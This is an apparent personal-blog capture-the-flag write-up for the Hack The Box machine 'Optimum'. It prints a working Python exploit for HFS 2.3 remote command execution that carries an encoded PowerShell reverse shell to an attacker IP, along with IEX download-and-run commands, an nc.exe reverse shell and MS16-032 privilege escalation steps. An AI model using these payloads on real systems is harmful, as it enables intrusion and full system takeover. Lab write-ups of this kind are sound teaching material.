<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Optimum | PwndSide</title>
<meta name=keywords content="windows,web,privesc"><meta name=description content="A windows friendly machine with a Remote Command Injection which allow us to gain access to the user and a easy privesc with the MS16-032 exploit which is a unpatched kernel vulnerability."><meta name=author content="Ayman Boulaich"><link rel=canonical href=https://canonical.url/to/page><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.3613efbd0b1772781e8f49935e973cae632a7f61471c05b17be155505ccf87b5.css integrity="sha256-NhPvvQsXcngej0mTXpc8rmMqf2FHHAWxe+FVUFzPh7U=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script><link rel=icon href=https://pwndside.github.io/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=https://pwndside.github.io/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=https://pwndside.github.io/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=https://pwndside.github.io/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=https://pwndside.github.io/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script>var doNotTrack=!1;doNotTrack||(function(e,t,n,s,o,i,a){e.GoogleAnalyticsObject=o,e[o]=e[o]||function(){(e[o].q=e[o].q||[]).push(arguments)},e[o].l=1*new Date,i=t.createElement(n),a=t.getElementsByTagName(n)[0],i.async=1,i.src=s,a.parentNode.insertBefore(i,a)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-123-45","auto"),ga("send","pageview"))</script><meta property="og:title" content="Optimum"><meta property="og:description" content="A windows friendly machine with a Remote Command Injection which allow us to gain access to the user and a easy privesc with the MS16-032 exploit which is a unpatched kernel vulnerability."><meta property="og:type" content="article"><meta property="og:url" content="https://pwndside.github.io/posts/optimum-htb/"><meta property="og:image" content="https://pwndside.github.io/%3Cimage%20path/url%3E"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-07-20T23:36:20+02:00"><meta property="article:modified_time" content="2023-07-20T23:36:20+02:00"><meta property="og:site_name" content="PwndSide"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://pwndside.github.io/%3Cimage%20path/url%3E"><meta name=twitter:title content="Optimum"><meta name=twitter:description content="A windows friendly machine with a Remote Command Injection which allow us to gain access to the user and a easy privesc with the MS16-032 exploit which is a unpatched kernel vulnerability."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://pwndside.github.io/posts/"},{"@type":"ListItem","position":2,"name":"Optimum","item":"https://pwndside.github.io/posts/optimum-htb/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Optimum","name":"Optimum","description":"A windows friendly machine with a Remote Command Injection which allow us to gain access to the user and a easy privesc with the MS16-032 exploit which is a unpatched kernel vulnerability.","keywords":["windows","web","privesc"],"articleBody":"Room Information Room name: Optimum Difficulty level: Easy Room link: https://app.hackthebox.com/machines/Optimum Tools Used Nmap Searchsploit winPEAS Sherlock Port Scanning sudo nmap $IP -n -Pn -vvv --min-rate 5000 PORT STATE SERVICE REASON VERSION 80/tcp open http syn-ack ttl 127 HttpFileServer httpd 2.3 |_http-favicon: Unknown favicon MD5: 759792EDD4EF8E6BC2D1877D27153CB1 |_http-title: HFS / |_http-server-header: HFS 2.3 | http-methods: |_ Supported Methods: GET HEAD POST Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows With a quick port scan we can observe that the only thing which seems open is webpage running at port 80.\nEnumeration If we take a quick look to the page we can see that is a http file transfer server.\nThe home page leaks the version of HFS that is using in this case is the HFS 2.3.\nLet’s see if we can find any exploit in searchsploit.\nExploiting There are a lot of exploits talking about Remote Command Injection this can help us to put a reverse shell on the remote machine. I have chosen HFS (HTTP File Server) 2.3.x - Remote Command Execution (3).\n# Exploit Title: HFS (HTTP File Server) 2.3.x - Remote Command Execution (3) # Google Dork: intext:\"httpfileserver 2.3\" # Date: 20/02/2021 # Exploit Author: Pergyz # Vendor Homepage: http://www.rejetto.com/hfs/ # Software Link: https://sourceforge.net/projects/hfs/ # Version: 2.3.x # Tested on: Microsoft Windows Server 2012 R2 Standard # CVE : CVE-2014-6287 # Reference: https://www.rejetto.com/wiki/index.php/HFS:_scripting_commands #!/usr/bin/python3 import base64 import os import urllib.request import urllib.parse lhost = \"10.10.14.20\" lport = 4444 rhost = \"10.10.10.8\" rport = 80 # Define the command to be written to a file command = f'$client = New-Object System.Net.Sockets.TCPClient(\"{lhost}\",{lport}); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{{0}}; while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){{; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i); $sendback = (Invoke-Expression $data 2\u003e\u00261 | Out-String ); $sendback2 = $sendback + \"PS \" + (Get-Location).Path + \"\u003e \"; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}}; $client.Close()' # Encode the command in base64 format encoded_command = base64.b64encode(command.encode(\"utf-16le\")).decode() print(\"\\nEncoded the command in base64 format...\") # Define the payload to be included in the URL payload = f'exec|powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -EncodedCommand {encoded_command}' # Encode the payload and send a HTTP GET request encoded_payload = urllib.parse.quote_plus(payload) url = f'http://{rhost}:{rport}/?search=%00{{.{encoded_payload}.}}' urllib.request.urlopen(url) print(\"\\nEncoded the payload and sent a HTTP GET request to the target...\") # Print some information print(\"\\nPrinting some information for debugging...\") print(\"lhost: \", lhost) print(\"lport: \", lport) print(\"rhost: \", rhost) print(\"rport: \", rport) print(\"payload: \", payload) # Listen for connections print(\"\\nListening for connection...\") os.system(f'nc -lv {lport}') This code is a pretty simple python implementation which allow us to put a reverse shell in the remote machine sending a command in the search section of the url http://10.10.10.8/?search=%00{{.{encoded_payload}.}}.\nBellow you can see the powershell command which we are using.\n$client = New-Object System.Net.Sockets.TCPClient(\"{lhost}\",{lport}); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{{0}}; while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){{; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i); $sendback = (Invoke-Expression $data 2\u003e\u00261 | Out-String ); $sendback2 = $sendback + \"PS \" + (Get-Location).Path + \"\u003e \"; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}}; $client.Close() The command is encoded helping us to keep the victim machine from noticing.\nIn this exploit only we need to change the lhost, lport and rhost, rport and run it.\nGaining an Initial Foothold Once executed we have successfully engaged the user.\nLet’s cat the user’s flag.\nEscalating Privilege Now let’s see more information about the system with winPEAS. We can send it via a smb server.\nsmbserver.py smbFolder $(pwd) -smb2support Only lefts copy it with:\ncopy \\\\10.10.14.20\\smbFolder\\winPEASx64.exe . Once executed we have the next valuable information.\nHostname: optimum ProductName: Windows Server 2012 R2 Standard EditionID: ServerStandard ReleaseId: BuildBranch: CurrentMajorVersionNumber: CurrentVersion: 6.3 Architecture: AMD64 Now let’s take a look if this system has some common windows vulns to privesc. Normally I start with Watson but the minimum .NET version required by Watson in winPEAS is 4.5, and this host only has up to 4.0, so I am going to start with Sherlock.\nFirst let’s open a web server to load the script.\npython3 -m http.server 80 Now let’s load the script with powershell.\nIEX(New-Object Net.Webclient).downloadString('http://10.10.14.20/Sherlock.ps1') We can start the scan with Find-AllVulns\nTitle : User Mode to Ring (KiTrap0D) MSBulletin : MS10-015 CVEID : 2010-0232 Link : https://www.exploit-db.com/exploits/11199/ VulnStatus : Not supported on 64-bit systems Title : Task Scheduler .XML MSBulletin : MS10-092 CVEID : 2010-3338, 2010-3888 Link : https://www.exploit-db.com/exploits/19930/ VulnStatus : Not Vulnerable Title : NTUserMessageCall Win32k Kernel Pool Overflow MSBulletin : MS13-053 CVEID : 2013-1300 Link : https://www.exploit-db.com/exploits/33213/ VulnStatus : Not supported on 64-bit systems Title : TrackPopupMenuEx Win32k NULL Page MSBulletin : MS13-081 CVEID : 2013-3881 Link : https://www.exploit-db.com/exploits/31576/ VulnStatus : Not supported on 64-bit systems Title : TrackPopupMenu Win32k Null Pointer Dereference MSBulletin : MS14-058 CVEID : 2014-4113 Link : https://www.exploit-db.com/exploits/35101/ VulnStatus : Not Vulnerable Title : ClientCopyImage Win32k MSBulletin : MS15-051 CVEID : 2015-1701, 2015-2433 Link : https://www.exploit-db.com/exploits/37367/ VulnStatus : Not Vulnerable Title : Font Driver Buffer Overflow MSBulletin : MS15-078 CVEID : 2015-2426, 2015-2433 Link : https://www.exploit-db.com/exploits/38222/ VulnStatus : Not Vulnerable Title : 'mrxdav.sys' WebDAV MSBulletin : MS16-016 CVEID : 2016-0051 Link : https://www.exploit-db.com/exploits/40085/ VulnStatus : Not supported on 64-bit systems Title : Secondary Logon Handle MSBulletin : MS16-032 CVEID : 2016-0099 Link : https://www.exploit-db.com/exploits/39719/ VulnStatus : Appears Vulnerable Title : Windows Kernel-Mode Drivers EoP MSBulletin : MS16-034 CVEID : 2016-0093/94/95/96 Link : https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS1 6-034? VulnStatus : Appears Vulnerable Title : Win32k Elevation of Privilege MSBulletin : MS16-135 CVEID : 2016-7255 Link : https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/S ample-Exploits/MS16-135 VulnStatus : Appears Vulnerable Title : Nessus Agent 6.6.2 - 6.10.3 MSBulletin : N/A CVEID : 2017-7199 Link : https://aspe1337.blogspot.co.uk/2017/04/writeup-of-cve-2017-7199.h tml VulnStatus : Not Vulnerable The only three vulns that Appears Vulnerable are the MS16-032, MS16-034 and MS16-135.\nI tried to run the three vulns many different ways but no one seems to work, then I realized of the importance of the architecture.\nIf we put the next command:\nWe observe that the system is 64 bits but the powershell that we have is 32 bits one. Our scripts can’t be loaded.\nThere is a way to change the shell to a 64 bits one by putting the absolut path of the shell we are going to use in the command injection script. We can follow the next table to know where is the powershell path depending on the architecture we start from.\nChanging the path in the script, the payload line looks like this:\n# Define the payload to be included in the URL payload = f'exec|\\\\Windows\\\\sysnative\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -EncodedCommand {encoded_command}' Let’s run it again and check if this works well.\nMS16-032 If we follow the link of the sherlock scan we can see that is an exploit db powershell script, so let’s download it with searchsploit.\nIf we put again the http server, try to load it and run it, the script doesn’t seems to do nothing.\nIt’s possible that the scripts is popping a new window shell with root privilege, but in our scenario it doesn’t help us. I found a variation of this script here which allow us to introduce a command to the root shell, so I created a powershell file called revShell.ps1 with only the reverse shell command and started a http server in the file directory.\n$client = New-Object System.Net.Sockets.TCPClient(\"10.10.14.20\",4444); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{{0}}; while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){{; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i); $sendback = (Invoke-Expression $data 2\u003e\u00261 | Out-String ); $sendback2 = $sendback + \"PS \" + (Get-Location).Path + \"\u003e \"; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}}; $client.Close() And with a nc listener, I run the Invoke-MS16032.ps1 script with the next command.\nsudo nc -lv 4444 Invoke-MS16032 -Command \"IEX(New-Object Net.Webclient).downloadString('http://10.10.14.20/revShell.ps1')\" I tried to run the previous command in many different ways but doesn’t worked, so I changed a little bit the script to put a nc reverse shell instead.\nC:\\Windows\\Temp\\PrivEsc\\nc.exe -e cmd 10.10.14.20 4444 In this way, only we will need to copy a nc binary into the \\Windows\\Temp\\PrivEsc folder, so I started a smbserver.py to copy it (The binary which I used is the SecLists one).\ncd \\Windows\\Temp mkdir PrivEsc copy \\\\10.10.14.20\\smbFolder\\nc.exe . Now let’s run again the command.\nWe are root now.\nOnly have to find root’s flag.\nThank you for reading, and happy hacking! 😄\n","wordCount":"1355","inLanguage":"en","image":"https://pwndside.github.io/%3Cimage%20path/url%3E","datePublished":"2023-07-20T23:36:20+02:00","dateModified":"2023-07-20T23:36:20+02:00","author":{"@type":"Person","name":"Ayman Boulaich"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://pwndside.github.io/posts/optimum-htb/"},"publisher":{"@type":"Organization","name":"PwndSide","logo":{"@type":"ImageObject","url":"https://pwndside.github.io/%3Clink%20/%20abs%20url%3E"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://pwndside.github.io/ accesskey=h title="PwndSide (Alt + H)"><img src=https://pwndside.github.io/apple-touch-icon.png alt aria-label=logo height=35>PwndSide</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://pwndside.github.io/categories/hackthebox title=HackTheBox><span>HackTheBox</span></a></li><li><a href=https://pwndside.github.io/categories/ctf title="CTF's"><span>CTF's</span></a></li><li><a href=https://pwndside.github.io/about/whoami/ title=whoami><span>whoami</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://pwndside.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://pwndside.github.io/posts/>Posts</a></div><h1 class=post-title>Optimum</h1><div class=post-description>A windows friendly machine with a Remote Command Injection which allow us to gain access to the user and a easy privesc with the MS16-032 exploit which is a unpatched kernel vulnerability.</div><div class=post-meta>&lt;span title='2023-07-20 23:36:20 +0200 CEST'>July 20, 2023&lt;/span>&amp;nbsp;·&amp;nbsp;7 min&amp;nbsp;·&amp;nbsp;1355 words&amp;nbsp;·&amp;nbsp;Ayman Boulaich&nbsp;|&nbsp;<a href=https://github.com/pwndside/pwndside.github.io/content/posts/optimum-htb.md rel="noopener noreferrer" target=_blank>Suggest Changes</a></div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#room-information>Room Information</a></li><li><a href=#tools-used>Tools Used</a></li><li><a href=#port-scanning>Port Scanning</a></li><li><a href=#enumeration>Enumeration</a></li><li><a href=#exploiting>Exploiting</a></li><li><a href=#gaining-an-initial-foothold>Gaining an Initial Foothold</a></li><li><a href=#escalating-privilege>Escalating Privilege</a><ul><li><a href=#ms16-032>MS16-032</a></li></ul></li></ul></nav></div></details></div><div class=post-content><h2 id=room-information>Room Information<a hidden class=anchor aria-hidden=true href=#room-information>#</a></h2><ul><li>Room name: Optimum</li><li>Difficulty level: Easy</li><li>Room link: <a href=https://app.hackthebox.com/machines/Optimum>https://app.hackthebox.com/machines/Optimum</a></li></ul><p><img loading=lazy src=/HTB/optimum-icon.png alt=Untitled></p><h2 id=tools-used>Tools Used<a hidden class=anchor aria-hidden=true href=#tools-used>#</a></h2><ul><li>Nmap</li><li>Searchsploit</li><li>winPEAS</li><li>Sherlock</li></ul><h2 id=port-scanning>Port Scanning<a hidden class=anchor aria-hidden=true href=#port-scanning>#</a></h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo nmap <span class=nv>$IP</span> -n -Pn -vvv --min-rate <span class=m>5000</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>PORT   STATE SERVICE REASON          VERSION
</span></span><span class=line><span class=cl>80/tcp open  http    syn-ack ttl <span class=m>127</span> HttpFileServer httpd 2.3
</span></span><span class=line><span class=cl><span class=p>|</span>_http-favicon: Unknown favicon MD5: 759792EDD4EF8E6BC2D1877D27153CB1
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: HFS /
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: HFS 2.3
</span></span><span class=line><span class=cl><span class=p>|</span> http-methods:
</span></span><span class=line><span class=cl><span class=p>|</span>_  Supported Methods: GET HEAD POST
</span></span><span class=line><span class=cl>Service Info: OS: Windows<span class=p>;</span> CPE: cpe:/o:microsoft:windows
</span></span></code></pre></div><p>With a quick port scan we can observe that the only thing which seems open is webpage running at <strong>port 80.</strong></p><h2 id=enumeration>Enumeration<a hidden class=anchor aria-hidden=true href=#enumeration>#</a></h2><p><img loading=lazy src=/HTB/optimum-1.png alt=Untitled></p><p>If we take a quick look to the page we can see that is a http file transfer server.</p><p>The home page leaks the version of HFS that is using in this case is the <strong>HFS 2.3</strong>.</p><p><img loading=lazy src=/HTB/optimum-2.png alt=Untitled></p><p>Let’s see if we can find any exploit in <strong>searchsploit.</strong></p><p><img loading=lazy src=/HTB/optimum-3.png alt=Untitled></p><h2 id=exploiting>Exploiting<a hidden class=anchor aria-hidden=true href=#exploiting>#</a></h2><p>There are a lot of exploits talking about Remote Command Injection this can help us to put a reverse shell on the remote machine. I have chosen <code>HFS (HTTP File Server) 2.3.x - Remote Command Execution (3)</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># Exploit Title: HFS (HTTP File Server) 2.3.x - Remote Command Execution (3)</span>
</span></span><span class=line><span class=cl><span class=c1># Google Dork: intext:&#34;httpfileserver 2.3&#34;</span>
</span></span><span class=line><span class=cl><span class=c1># Date: 20/02/2021</span>
</span></span><span class=line><span class=cl><span class=c1># Exploit Author: Pergyz</span>
</span></span><span class=line><span class=cl><span class=c1># Vendor Homepage: http://www.rejetto.com/hfs/</span>
</span></span><span class=line><span class=cl><span class=c1># Software Link: https://sourceforge.net/projects/hfs/</span>
</span></span><span class=line><span class=cl><span class=c1># Version: 2.3.x</span>
</span></span><span class=line><span class=cl><span class=c1># Tested on: Microsoft Windows Server 2012 R2 Standard</span>
</span></span><span class=line><span class=cl><span class=c1># CVE : CVE-2014-6287</span>
</span></span><span class=line><span class=cl><span class=c1># Reference: https://www.rejetto.com/wiki/index.php/HFS:_scripting_commands</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#!/usr/bin/python3</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>base64</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>urllib.request</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>urllib.parse</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>lhost</span> <span class=o>=</span> <span class=s2>&#34;10.10.14.20&#34;</span>
</span></span><span class=line><span class=cl><span class=n>lport</span> <span class=o>=</span> <span class=mi>4444</span>
</span></span><span class=line><span class=cl><span class=n>rhost</span> <span class=o>=</span> <span class=s2>&#34;10.10.10.8&#34;</span>
</span></span><span class=line><span class=cl><span class=n>rport</span> <span class=o>=</span> <span class=mi>80</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Define the command to be written to a file</span>
</span></span><span class=line><span class=cl><span class=n>command</span> <span class=o>=</span> <span class=sa>f</span><span class=s1>&#39;$client = New-Object System.Net.Sockets.TCPClient(&#34;</span><span class=si>{</span><span class=n>lhost</span><span class=si>}</span><span class=s1>&#34;,</span><span class=si>{</span><span class=n>lport</span><span class=si>}</span><span class=s1>); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%</span><span class=se>{{</span><span class=s1>0</span><span class=se>}}</span><span class=s1>; while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0)</span><span class=se>{{</span><span class=s1>; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i); $sendback = (Invoke-Expression $data 2&gt;&amp;1 | Out-String ); $sendback2 = $sendback + &#34;PS &#34; + (Get-Location).Path + &#34;&gt; &#34;; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()</span><span class=se>}}</span><span class=s1>; $client.Close()&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Encode the command in base64 format</span>
</span></span><span class=line><span class=cl><span class=n>encoded_command</span> <span class=o>=</span> <span class=n>base64</span><span class=o>.</span><span class=n>b64encode</span><span class=p>(</span><span class=n>command</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s2>&#34;utf-16le&#34;</span><span class=p>))</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>Encoded the command in base64 format...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Define the payload to be included in the URL</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>f</span><span class=s1>&#39;exec|powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -EncodedCommand </span><span class=si>{</span><span class=n>encoded_command</span><span class=si>}</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Encode the payload and send a HTTP GET request</span>
</span></span><span class=line><span class=cl><span class=n>encoded_payload</span> <span class=o>=</span> <span class=n>urllib</span><span class=o>.</span><span class=n>parse</span><span class=o>.</span><span class=n>quote_plus</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=sa>f</span><span class=s1>&#39;http://</span><span class=si>{</span><span class=n>rhost</span><span class=si>}</span><span class=s1>:</span><span class=si>{</span><span class=n>rport</span><span class=si>}</span><span class=s1>/?search=%00</span><span class=se>{{</span><span class=s1>.</span><span class=si>{</span><span class=n>encoded_payload</span><span class=si>}</span><span class=s1>.</span><span class=se>}}</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=n>urllib</span><span class=o>.</span><span class=n>request</span><span class=o>.</span><span class=n>urlopen</span><span class=p>(</span><span class=n>url</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>Encoded the payload and sent a HTTP GET request to the target...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Print some information</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>Printing some information for debugging...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;lhost: &#34;</span><span class=p>,</span> <span class=n>lhost</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;lport: &#34;</span><span class=p>,</span> <span class=n>lport</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;rhost: &#34;</span><span class=p>,</span> <span class=n>rhost</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;rport: &#34;</span><span class=p>,</span> <span class=n>rport</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;payload: &#34;</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Listen for connections</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>Listening for connection...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>os</span><span class=o>.</span><span class=n>system</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;nc -lv </span><span class=si>{</span><span class=n>lport</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span></code></pre></div><p>This code is a pretty simple python implementation which allow us to put a reverse shell in the remote machine sending a command in the search section of the url <code>http://10.10.10.8/?search=%00{{.{encoded_payload}.}}</code>.</p><p>Bellow you can see the powershell command which we are using.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nv>$client</span> <span class=p>=</span> <span class=nb>New-Object</span> <span class=n>System</span><span class=p>.</span><span class=py>Net</span><span class=p>.</span><span class=py>Sockets</span><span class=p>.</span><span class=py>TCPClient</span><span class=p>(</span><span class=s2>&#34;{lhost}&#34;</span><span class=p>,{</span><span class=n>lport</span><span class=p>});</span> <span class=nv>$stream</span> <span class=p>=</span> <span class=nv>$client</span><span class=p>.</span><span class=py>GetStream</span><span class=p>();</span> <span class=p>[</span><span class=no>byte[]</span><span class=p>]</span><span class=nv>$bytes</span> <span class=p>=</span> <span class=mf>0</span><span class=p>.</span><span class=mf>.65535</span><span class=p>|%{{</span><span class=mf>0</span><span class=p>}};</span> <span class=k>while</span><span class=p>((</span><span class=nv>$i</span> <span class=p>=</span> <span class=nv>$stream</span><span class=p>.</span><span class=py>Read</span><span class=p>(</span><span class=nv>$bytes</span><span class=p>,</span><span class=mf>0</span><span class=p>,</span><span class=nv>$bytes</span><span class=p>.</span><span class=n>Length</span><span class=p>))</span> <span class=o>-ne</span> <span class=mf>0</span><span class=p>){{;</span> <span class=nv>$data</span> <span class=p>=</span> <span class=p>(</span><span class=nb>New-Object</span> <span class=n>-TypeName</span> <span class=n>System</span><span class=p>.</span><span class=py>Text</span><span class=p>.</span><span class=n>ASCIIEncoding</span><span class=p>).</span><span class=py>GetString</span><span class=p>(</span><span class=nv>$bytes</span><span class=p>,</span><span class=mf>0</span><span class=p>,</span><span class=nv>$i</span><span class=p>);</span> <span class=nv>$sendback</span> <span class=p>=</span> <span class=p>(</span><span class=nb>Invoke-Expression</span> <span class=nv>$data</span> <span class=mf>2</span><span class=p>&gt;&amp;</span><span class=mf>1</span> <span class=p>|</span> <span class=nb>Out-String</span> <span class=p>);</span> <span class=nv>$sendback2</span> <span class=p>=</span> <span class=nv>$sendback</span> <span class=p>+</span> <span class=s2>&#34;PS &#34;</span> <span class=p>+</span> <span class=p>(</span><span class=nb>Get-Location</span><span class=p>).</span><span class=py>Path</span> <span class=p>+</span> <span class=s2>&#34;&gt; &#34;</span><span class=p>;</span> <span class=nv>$sendbyte</span> <span class=p>=</span> <span class=p>([</span><span class=no>text.encoding</span><span class=p>]::</span><span class=n>ASCII</span><span class=p>).</span><span class=py>GetBytes</span><span class=p>(</span><span class=nv>$sendback2</span><span class=p>);</span> <span class=nv>$stream</span><span class=p>.</span><span class=py>Write</span><span class=p>(</span><span class=nv>$sendbyte</span><span class=p>,</span><span class=mf>0</span><span class=p>,</span><span class=nv>$sendbyte</span><span class=p>.</span><span class=n>Length</span><span class=p>);</span> <span class=nv>$stream</span><span class=p>.</span><span class=py>Flush</span><span class=p>()}};</span> <span class=nv>$client</span><span class=p>.</span><span class=py>Close</span><span class=p>()</span>
